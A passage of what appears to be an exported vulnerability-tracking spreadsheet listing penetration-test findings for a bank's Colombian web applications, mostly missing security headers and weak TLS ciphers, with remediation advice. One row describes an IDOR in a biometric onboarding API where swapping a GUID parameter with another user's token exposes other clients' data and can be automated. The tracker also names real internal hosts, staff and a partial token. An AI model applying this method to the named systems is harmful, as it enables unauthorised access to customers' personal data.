    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="384"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <s v="MAN-68678d976c975521ca42a318"/>
    <s v="SC-25-CNMPO-003-AP-001"/>
    <x v="142"/>
    <m/>
    <s v="Solved"/>
    <x v="0"/>
    <n v="10"/>
    <m/>
    <m/>
    <s v="Recidam.olimpiait.com"/>
    <m/>
    <m/>
    <d v="2025-06-25T00:00:00"/>
    <n v="363"/>
    <d v="2025-07-05T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Las &quot;Referencias Inseguras a Objetos de manera Directa&quot; (IDOR) se producen cuando una aplicación proporciona acceso directo a los objetos en función de la entrada proporcionada AB409por el usuario (Normalmente un identificador de objeto, independientemente de su predictibilidad). Esta vulnerabilidad permite a los atacantes evadir la autorización y acceder a los recursos directamente modificando el valor de un parámetro utilizado para apuntar directamente a un objeto. Dichos recursos pueden ser entradas de bases de datos que pertenecen a otros usuarios, archivos en el sistema y más. Esto se debe al hecho de que la aplicación toma la entrada proporcionada por el usuario y la utiliza para recuperar un objeto sin realizar suficientes comprobaciones de autorización._x000a__x000a__x000a_El proceso de onboarding de httpX://www.cdt.santander.com.co tiene un flujo de autenticación_x000a_biométrico. Este proceso, realiza diferentes peticiones de validación sobre dominios de olimpiait.com_x000a_A cada flujo, se le asigna un valor con una cadena 8-4-4-12, que son 32 valores hexadecimales únicos_x000a_para cada cliente en cada flujo_x000a__x000a_Una vez el proceso se ha completado, se realiza una petición sobre la funcionalidad ConsultarProceso_x000a_donde se pueden identificar todos los datos en claro_x000a__x000a_Para evidenciar la falta de autorización, se ha iniciado el flujo con otros datos de cliente y se ha_x000a_reutilizado el código único y hexadecimal (ProcesoConvenioGUID) para, desde el usuario de Juan_x000a_Carlos Navarrete, el cual tiene el Auth Bearer token acabado en […]PJ08, visualizar información_x000a_sensible de otros clientes. A continuación, reutilizando dicho token y alterando el parámetro_x000a_ProcesoConvenioGUID, se puede identificar información sensible de otro cliente que tiene un flujo de_x000a_onboarding_x000a__x000a_Adicionalmente, este ID se puede automatizar, no existiendo ningún tipo de control ante peticiones_x000a_masivas, pudiendo llegar a identificar cualquier cliente dado de alta_x000a__x000a_Cabe destacar, que, tras 68 peticiones, no se ha identificado ningún GUID válido, pero con el tiempo_x000a_suficiente, se podría llegar a identificar clientes reales."/>
    <s v="Se recomienda introducir mecanismos de validación basado en accesos por usuario o roles, para acceder a la información identificada y comprobar en el lado del servidor que el usuario tiene privilegios de acceso a la información consultada. En este caso, dado que el token de sesión JWT (Autorización) identifica al usuario y su perfilado en el aplicativo, debe validarse dicho usuario y verificar si su perfilado tiene permisos sobre el objeto a consultar, crear, modificar, o borrar. Se recomienda aplicar las recomendaciones sobre cualquier operación del aplicativo que referencie a un objeto enviado en un parámetro de una petición, los cuales podrán ser modificados por el usuario antes de su envío al servidor."/>
    <s v="Un atacante puede evadir el sistema de autorización y acceder a los recursos del aplicativo directamente modificando el valor de un parámetro utilizado para apuntar directamente a un objeto, en este caso, el identificador de un usuario para actuar sobre su foto de perfil. Dichos recursos pueden ser registros, entradas de bases de datos que pertenecen a otros usuarios, archivos en el sistema o cualquier tipo de información a la que no debería tener acceso de manera previa, comprometiendo su confidencialidad ante consultas, o integridad o  Disponibilidad ante su modificación."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="385"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Go Any Where "/>
    <m/>
    <s v="SC-25-CNMPO-008-CO-001"/>
    <x v="179"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="3.1"/>
    <m/>
    <m/>
    <s v="https://servicios.santander.com.co/webclient/Login.xhtml"/>
    <m/>
    <m/>
    <d v="2025-06-25T00:00:00"/>
    <n v="363"/>
    <d v="2025-10-23T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Ciertos tipos de ficheros, como imágenes, PDFs o documentos de Microsoft Office almacenan información en forma de metadatos, tales como autor, fecha de creación, nombre de equipo, direccionamiento IP o tecnologías utilizadas. La aplicación web analizada alberga uno o más ficheros que contienen metadatos y que pueden  proporcionar información interna de la organización, tales como nombres de empleados, códigos de usuario o versiones de software."/>
    <s v="Se recomienda eliminar toda la información contenida en los metadatos de los documentos_x000a_generados y/o publicados en la aplicación. De manera adicional se puede implementar un_x000a_procedimiento para controlar los documentos a publicar, de manera tal de garantizar que los_x000a_mismos no contengan información sensible de la organización en sus metadatos"/>
    <s v="La información contenida en los metadatos de los archivos identificados podría ser utilizada por un_x000a_atacante para obtener un mayor conocimiento de la organización, tecnologías utilizadas e incluso_x000a_nombres de usuarios. Con esta información el atacante puede planificar ataques de ingeniería social_x000a_o Phishing dirigidos a determinados usuarios."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jorge Guzman"/>
  </r>
  <r>
    <n v="386"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Go Any Where "/>
    <m/>
    <s v="SC-25-CNMPO-008-CO-002"/>
    <x v="153"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="2.8"/>
    <m/>
    <m/>
    <s v="https://servicios.santander.com.co/webclien_x000a_t/Login.xhtml"/>
    <m/>
    <m/>
    <d v="2025-06-25T00:00:00"/>
    <n v="363"/>
    <d v="2025-10-23T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="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Chaining) son potencialmente vulnerables a este tipo ataques. "/>
    <s v="Se recomienda utilizar únicamente protocolos de cifrado robustos como TLS 1.2 o TLS 1.3, y_x000a_eliminar los protocolos débiles como TLS 1.0 o TLS 1.1. Adicionalmente, se recomienda eliminar_x000a_todos los algoritmos CBC (Cipher-Block-Chaining) que puedan estar en uso ._x000a_Además, se debe comprobar si la versión OpenSSL es 1.0.1d, 1.0.0k o 0.9.8y, las cuales tienen_x000a_corregida esta vulnerabilidad. Actualizar la versión de OpenSSL si tiene una versión sin la_x000a_vulnerabilidad corregida. "/>
    <s v="El protocolo TLS v1.1 y v1.2 y el protocolo DTLS v1.0 y v1.2, tal como se utiliza en OpenSSL, OpenJDK,_x000a_PolarSSL, y otros productos, no considera adecuadamente ataques a un requisito de verificación_x000a_MAC durante el proceso de relleno CBC malformado, lo que permite a atacantes remotos realizar_x000a_ataques distintivos y los ataques de recuperación de texto plano a través del análisis estadístico de_x000a_los datos de tiempo de los paquetes transmitidos."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jorge Guzman"/>
  </r>
  <r>
    <n v="387"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="MAN-685aac916c975521ca412395"/>
    <s v="SC-25-CNMPO-005-AP-001"/>
    <x v="117"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <n v="5.0999999999999996"/>
    <m/>
    <m/>
    <s v="https://confirming-factoring.santander.com.co/"/>
    <m/>
    <m/>
    <d v="2025-06-25T00:00:00"/>
    <n v="363"/>
    <d v="2025-09-23T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="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
    <s v="Se deben capturar y controlar todas los errores y excepciones producidas en la aplicación, o en los_x000a_sistemas que las sustentan, evitando proporcionar información útil a un posible atacante._x000a_Adicionalmente, se recomienda personalizar las páginas de error HTTP 40x y 50x para que no sean_x000a_descriptivas."/>
    <s v="Con estos datos revelados en los errores un atacante puede obtener información interna de la_x000a_aplicación o de las tecnologías utilizadas para sustentar la aplicación. De esta manera, el atacante_x000a_dispondrá de más información para poder realizar ataques especialmente dirigidos con una mayor_x000a_probabilidad de éxito, sobre las aplicaciones afectadas y/o los sistemas que la sustentan. "/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="388"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <m/>
    <s v="SC-25-CNMPO-005-CO-002"/>
    <x v="153"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="2.8"/>
    <m/>
    <m/>
    <s v="https://confirming-factoring.santander.com.co/"/>
    <m/>
    <m/>
    <d v="2025-06-25T00:00:00"/>
    <n v="363"/>
    <d v="2025-10-23T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="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Chaining) son potencialmente vulnerables a este tipo ataques. "/>
    <s v="Se recomienda utilizar únicamente protocolos de cifrado robustos como TLS 1.2 o TLS 1.3, y_x000a_eliminar los protocolos débiles como TLS 1.0 o TLS 1.1. Adicionalmente, se recomienda eliminar_x000a_todos los algoritmos CBC (Cipher-Block-Chaining) que puedan estar en uso ._x000a_Además, se debe comprobar si la versión OpenSSL es 1.0.1d, 1.0.0k o 0.9.8y, las cuales tienen_x000a_corregida esta vulnerabilidad. Actualizar la versión de OpenSSL si tiene una versión sin la_x000a_vulnerabilidad corregida. "/>
    <s v="El protocolo TLS v1.1 y v1.2 y el protocolo DTLS v1.0 y v1.2, tal como se utiliza en OpenSSL, OpenJDK,_x000a_PolarSSL, y otros productos, no considera adecuadamente ataques a un requisito de verificación_x000a_MAC durante el proceso de relleno CBC malformado, lo que permite a atacantes remotos realizar_x000a_ataques distintivos y los ataques de recuperación de texto plano a través del análisis estadístico de_x000a_los datos de tiempo de los paquetes transmitidos."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="389"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <s v="MAN-6862a1f46c975521ca41b5d6"/>
    <s v="SC-25-CNMPO-007-CO002"/>
    <x v="180"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <s v="6.1"/>
    <m/>
    <m/>
    <s v="Assets.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-07-01T00:00:00"/>
    <n v="357"/>
    <d v="2025-09-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La ausencia de la cabecera X-Frame-Options permite que el sitio web sea embebido en un &lt;iframe&gt; externo, habilitando posibles ataques de clickjacking."/>
    <s v="Configurar la cabecera X-Frame-Options con el valor DENY o SAMEORIGIN para prevenir que el sitio_x000a_sea cargado en marcos externos y mitigar ataques de clickjacking._x000a_Incluye la cabecera X-Frame-Options en todas las respuestas de contenido HTML con alguno de los_x000a_siguientes valores:_x000a_Opción más segura:_x000a_X-Frame-Options: DENY_x000a_(No permite que la página se cargue en ningún iframe)_x000a_Opción balanceada:_x000a_X-Frame-Options: SAMEORIGIN_x000a_(Solo permite carga en iframe si el origen es el mismo, útil para portales que usan marcos_x000a_internamente)"/>
    <s v="Un atacante puede engañar a un usuario para que interactúe con elementos invisibles del sitio legítimo embebido en un sitio malicioso, provocando acciones no deseadas (ej. Aprobar transacciones, cambiar configuraciones)."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="390"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <s v="MAN-6862a3e06c975521ca41b5d7"/>
    <s v="SC-25-CNMPO-007-CO003"/>
    <x v="180"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <s v="6.1"/>
    <m/>
    <m/>
    <s v="Even.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-07-01T00:00:00"/>
    <n v="357"/>
    <d v="2025-09-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La ausencia de la cabecera X-Frame-Options permite que el sitio web sea embebido en un &lt;iframe&gt; externo, habilitando posibles ataques de clickjacking."/>
    <s v="Configurar la cabecera X-Frame-Options con el valor DENY o SAMEORIGIN para prevenir que el sitio_x000a_sea cargado en marcos externos y mitigar ataques de clickjacking._x000a_Incluye la cabecera X-Frame-Options en todas las respuestas de contenido HTML con alguno de los_x000a_siguientes valores:_x000a_Opción más segura:_x000a_X-Frame-Options: DENY_x000a_(No permite que la página se cargue en ningún iframe)_x000a_Opción balanceada:_x000a_X-Frame-Options: SAMEORIGIN_x000a_(Solo permite carga en iframe si el origen es el mismo, útil para portales que usan marcos_x000a_internamente)"/>
    <s v="Un atacante puede engañar a un usuario para que interactúe con elementos invisibles del sitio legítimo embebido en un sitio malicioso, provocando acciones no deseadas (ej. Aprobar transacciones, cambiar configuraciones)."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="391"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <s v="MAN-6862a3e06c975521ca41b5d8"/>
    <s v="SC-25-CNMPO-007-CO004"/>
    <x v="180"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <s v="6.1"/>
    <m/>
    <m/>
    <s v="Gdcs.prod.mb.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-07-01T00:00:00"/>
    <n v="357"/>
    <d v="2025-09-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La ausencia de la cabecera X-Frame-Options permite que el sitio web sea embebido en un &lt;iframe&gt; externo, habilitando posibles ataques de clickjacking."/>
    <s v="Configurar la cabecera X-Frame-Options con el valor DENY o SAMEORIGIN para prevenir que el sitio_x000a_sea cargado en marcos externos y mitigar ataques de clickjacking._x000a_Incluye la cabecera X-Frame-Options en todas las respuestas de contenido HTML con alguno de los_x000a_siguientes valores:_x000a_Opción más segura:_x000a_X-Frame-Options: DENY_x000a_(No permite que la página se cargue en ningún iframe)_x000a_Opción balanceada:_x000a_X-Frame-Options: SAMEORIGIN_x000a_(Solo permite carga en iframe si el origen es el mismo, útil para portales que usan marcos_x000a_internamente)"/>
    <s v="Un atacante puede engañar a un usuario para que interactúe con elementos invisibles del sitio legítimo embebido en un sitio malicioso, provocando acciones no deseadas (ej. Aprobar transacciones, cambiar configuraciones)."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="392"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <s v="MAN-6862a3e06c975521ca41b5d9"/>
    <s v="SC-25-CNMPO-007-CO005"/>
    <x v="180"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <s v="6.1"/>
    <m/>
    <m/>
    <s v="Teal.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-07-01T00:00:00"/>
    <n v="357"/>
    <d v="2025-09-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La ausencia de la cabecera X-Frame-Options permite que el sitio web sea embebido en un &lt;iframe&gt; externo, habilitando posibles ataques de clickjacking."/>
    <s v="Configurar la cabecera X-Frame-Options con el valor DENY o SAMEORIGIN para prevenir que el sitio_x000a_sea cargado en marcos externos y mitigar ataques de clickjacking._x000a_Incluye la cabecera X-Frame-Options en todas las respuestas de contenido HTML con alguno de los_x000a_siguientes valores:_x000a_Opción más segura:_x000a_X-Frame-Options: DENY_x000a_(No permite que la página se cargue en ningún iframe)_x000a_Opción balanceada:_x000a_X-Frame-Options: SAMEORIGIN_x000a_(Solo permite carga en iframe si el origen es el mismo, útil para portales que usan marcos_x000a_internamente)"/>
    <s v="Un atacante puede engañar a un usuario para que interactúe con elementos invisibles del sitio legítimo embebido en un sitio malicioso, provocando acciones no deseadas (ej. Aprobar transacciones, cambiar configuraciones)."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="393"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <s v="MAN-6862aa706c975521ca41b5da"/>
    <s v="SC-25-CNMPO-007-CO006"/>
    <x v="181"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <s v="6.2"/>
    <m/>
    <m/>
    <s v="Even.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-07-01T00:00:00"/>
    <n v="357"/>
    <d v="2025-09-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Si esta cabecera no está presente o no está configurada correctamente, los navegadores pueden intentar &quot;adivinar&quot; el tipo de contenido (MIME sniffing), incluso si el servidor ha especificado uno. Esto puede llevar a que se interpreten archivos como ejecutables o scripts cuando no deberían serlo."/>
    <s v="Establecer la cabecera X-Content-Type-Options con el valor nosniff en todas las respuestas HTTP_x000a_para evitar que el navegador haga MIME sniffing."/>
    <s v="Un atacante podría subir un archivo aparentemente inofensivo (por ejemplo, .txt) que el navegador_x000a_podría interpretar como un script (.js), provocando una ejecución de código no deseada (XSS)."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="394"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <s v="MAN-6862ab676c975521ca41b5db"/>
    <s v="SC-25-CNMPO-007-CO007"/>
    <x v="181"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <s v="6.3"/>
    <m/>
    <m/>
    <s v="Gdcs.prod.mb.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-07-01T00:00:00"/>
    <n v="357"/>
    <d v="2025-09-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Si esta cabecera no está presente o no está configurada correctamente, los navegadores pueden intentar &quot;adivinar&quot; el tipo de contenido (MIME sniffing), incluso si el servidor ha especificado uno. Esto puede llevar a que se interpreten archivos como ejecutables o scripts cuando no deberían serlo."/>
    <s v="Establecer la cabecera X-Content-Type-Options con el valor nosniff en todas las respuestas HTTP_x000a_para evitar que el navegador haga MIME sniffing."/>
    <s v="Un atacante podría subir un archivo aparentemente inofensivo (por ejemplo, .txt) que el navegador_x000a_podría interpretar como un script (.js), provocando una ejecución de código no deseada (XSS)."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="395"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <s v="MAN-6862ab676c975521ca41b5dc"/>
    <s v="SC-25-CNMPO-007-CO008"/>
    <x v="181"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <s v="6.4"/>
    <m/>
    <m/>
    <s v="Teal.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-07-01T00:00:00"/>
    <n v="357"/>
    <d v="2025-09-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Si esta cabecera no está presente o no está configurada correctamente, los navegadores pueden intentar &quot;adivinar&quot; el tipo de contenido (MIME sniffing), incluso si el servidor ha especificado uno. Esto puede llevar a que se interpreten archivos como ejecutables o scripts cuando no deberían serlo."/>
    <s v="Establecer la cabecera X-Content-Type-Options con el valor nosniff en todas las respuestas HTTP_x000a_para evitar que el navegador haga MIME sniffing."/>
    <s v="Un atacante podría subir un archivo aparentemente inofensivo (por ejemplo, .txt) que el navegador_x000a_podría interpretar como un script (.js), provocando una ejecución de código no deseada (XSS)."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="396"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <m/>
    <s v="SC-25-CNMPO-007-CO009"/>
    <x v="182"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <s v="3.2"/>
    <m/>
    <m/>
    <s v="Even.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-07-01T00:00:00"/>
    <n v="357"/>
    <d v="2025-10-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha detectado que el servidor afectado utiliza algoritmos de cifrado CBC sobre TLS, por lo que se ve afectado por la vulnerabilidad &quot;Lucky13&quot;. Todas las suites de cifrado TLS, incluido &quot;Cipher Block Chaining&quot;, son potencialmente vulnerables a este tipo de ataque. Este ataque consiste en detectar pequeñas diferencias de tiempo cuando se generan errores TLS al enviar solicitudes maliciosas al servidor. Con estos ataques es posible descifrar bloques TLS, aunque el número de solicitudes depende del tipo de conexión, el ruido y el algoritmo MAC utilizado."/>
    <s v="Se ha detectado que es posible utilizar mecanismos de cifrado considerados inseguros en las comunicaciones con servidores, lo que podría permitir a un atacante comprometer la confidencialidad de la información intercambiada entre un cliente y el servidor, y en algunos casos también provocar la indisponibilidad del servidor."/>
    <s v="Se recomienda habilitar conjuntos de cifrado robustos como TLS 1.2 o TLS 1.3 y deshabilitar_x000a_protocolos débiles como TLS 1.0 y TLS 1.1. Además, deshabilitar todos los algoritmos CBC."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="397"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <m/>
    <s v="SC-25-CNMPO-007-CO010"/>
    <x v="183"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <s v="3.8"/>
    <m/>
    <m/>
    <s v="www.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-07-01T00:00:00"/>
    <n v="357"/>
    <d v="2025-10-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante la realización de las pruebas se ha podido comprobar que el servidor no responde con la cabecera Referrer-Policy. Es una cabecera de seguridad HTTP que controla cuánta información del origen (URL de referencia) se envía al hacer solicitudes desde una página web. Sirve para proteger datos sensibles evitando que se filtren al navegar entre sitios o cargar recursos externos."/>
    <s v="Configurar la cabecera Referrer-Policy con una directiva adecuada que limite la exposición de_x000a_información en las solicitudes salientes, alineándola con las necesidades de seguridad y privacidad_x000a_de la aplicación. Esto ayuda a prevenir la fuga de datos sensibles hacia dominios externos."/>
    <s v="Sin esta cabecera, los navegadores pueden enviar URLs completas (incluyendo parámetros_x000a_sensibles) como referencias a sitios externos al hacer clic en enlaces o al cargar recursos externos._x000a_Esto puede exponer información confidencial como tokens, IDs de sesión, parámetros de búsqueda,_x000a_etc., facilitando ataques de tipo leakage de datos, phishing o reconocimiento de estructura interna de la_x000a_aplicación"/>
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="398"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <m/>
    <s v="SC-25-CNMPO-007-CO011"/>
    <x v="183"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <s v="3.8"/>
    <m/>
    <m/>
    <s v="Assets.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-07-01T00:00:00"/>
    <n v="357"/>
    <d v="2025-10-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante la realización de las pruebas se ha podido comprobar que el servidor no responde con la cabecera Referrer-Policy. Es una cabecera de seguridad HTTP que controla cuánta información del origen (URL de referencia) se envía al hacer solicitudes desde una página web. Sirve para proteger datos sensibles evitando que se filtren al navegar entre sitios o cargar recursos externos."/>
    <s v="Configurar la cabecera Referrer-Policy con una directiva adecuada que limite la exposición de_x000a_información en las solicitudes salientes, alineándola con las necesidades de seguridad y privacidad_x000a_de la aplicación. Esto ayuda a prevenir la fuga de datos sensibles hacia dominios externos."/>
    <s v="Sin esta cabecera, los navegadores pueden enviar URLs completas (incluyendo parámetros_x000a_sensibles) como referencias a sitios externos al hacer clic en enlaces o al cargar recursos externos._x000a_Esto puede exponer información confidencial como tokens, IDs de sesión, parámetros de búsqueda,_x000a_etc., facilitando ataques de tipo leakage de datos, phishing o reconocimiento de estructura interna de la_x000a_aplicación"/>
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="399"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <m/>
    <s v="SC-25-CNMPO-007-CO012"/>
    <x v="183"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <s v="3.8"/>
    <m/>
    <m/>
    <s v="Even.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-07-01T00:00:00"/>
    <n v="357"/>
    <d v="2025-10-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante la realización de las pruebas se ha podido comprobar que el servidor no responde con la cabecera Referrer-Policy. Es una cabecera de seguridad HTTP que controla cuánta información del origen (URL de referencia) se envía al hacer solicitudes desde una página web. Sirve para proteger datos sensibles evitando que se filtren al navegar entre sitios o cargar recursos externos."/>
    <s v="Configurar la cabecera Referrer-Policy con una directiva adecuada que limite la exposición de_x000a_información en las solicitudes salientes, alineándola con las necesidades de seguridad y privacidad_x000a_de la aplicación. Esto ayuda a prevenir la fuga de datos sensibles hacia dominios externos."/>
    <s v="Sin esta cabecera, los navegadores pueden enviar URLs completas (incluyendo parámetros_x000a_sensibles) como referencias a sitios externos al hacer clic en enlaces o al cargar recursos externos._x000a_Esto puede exponer información confidencial como tokens, IDs de sesión, parámetros de búsqueda,_x000a_etc., facilitando ataques de tipo leakage de datos, phishing o reconocimiento de estructura interna de la_x000a_aplicación"/>
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="400"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <m/>
    <s v="SC-25-CNMPO-007-CO013"/>
    <x v="183"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <s v="3.8"/>
    <m/>
    <m/>
    <s v="Bo.prod.cc.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-07-01T00:00:00"/>
    <n v="357"/>
    <d v="2025-10-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante la realización de las pruebas se ha podido comprobar que el servidor no responde con la cabecera Referrer-Policy. Es una cabecera de seguridad HTTP que controla cuánta información del origen (URL de referencia) se envía al hacer solicitudes desde una página web. Sirve para proteger datos sensibles evitando que se filtren al navegar entre sitios o cargar recursos externos."/>
    <s v="Configurar la cabecera Referrer-Policy con una directiva adecuada que limite la exposición de_x000a_información en las solicitudes salientes, alineándola con las necesidades de seguridad y privacidad_x000a_de la aplicación. Esto ayuda a prevenir la fuga de datos sensibles hacia dominios externos."/>
    <s v="Sin esta cabecera, los navegadores pueden enviar URLs completas (incluyendo parámetros_x000a_sensibles) como referencias a sitios externos al hacer clic en enlaces o al cargar recursos externos._x000a_Esto puede exponer información confidencial como tokens, IDs de sesión, parámetros de búsqueda,_x000a_etc., facilitando ataques de tipo leakage de datos, phishing o reconocimiento de estructura interna de la_x000a_aplicación"/>
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="401"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="CDT"/>
    <m/>
    <s v="SC-25-CNMPO-007-CO014"/>
    <x v="183"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <s v="3.8"/>
    <m/>
    <m/>
    <s v="Gdcs.prod.mb.cdt.santander.com.co"/>
    <m/>
    <m/>
    <d v="2025-07-01T00:00:00"/>
    <n v="357"/>
    <d v="2025-10-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante la realización de las pruebas se ha podido comprobar que el servidor no responde con la cabecera Referrer-Policy. Es una cabecera de seguridad HTTP que controla cuánta información del origen (URL de referencia) se envía al hacer solicitudes desde una página web. Sirve para proteger datos sensibles evitando que se filtren al navegar entre sitios o cargar recursos externos."/>
    <s v="Configurar la cabecera Referrer-Policy con una directiva adecuada que limite la exposición de_x000a_información en las solicitudes salientes, alineándola con las necesidades de seguridad y privacidad_x000a_de la aplicación. Esto ayuda a prevenir la fuga de datos sensibles hacia dominios externos."/>
    <s v="Sin esta cabecera, los navegadores pueden enviar URLs completas (incluyendo parámetros_x000a_sensibles) como referencias a sitios externos al hacer clic en enlaces o al cargar recursos externos._x000a_Esto puede exponer información confidencial como tokens, IDs de sesión, parámetros de búsqueda,_x000a_etc., facilitando ataques de tipo leakage de datos, phishing o reconocimiento de estructura interna de la_x000a_aplicación"/>
    <s v="Sin definir"/>
    <m/>
    <s v="Olga Maria Camargo Orjuela"/>
  </r>
  <r>
    <n v="402"/>
    <s v="BSNC"/>
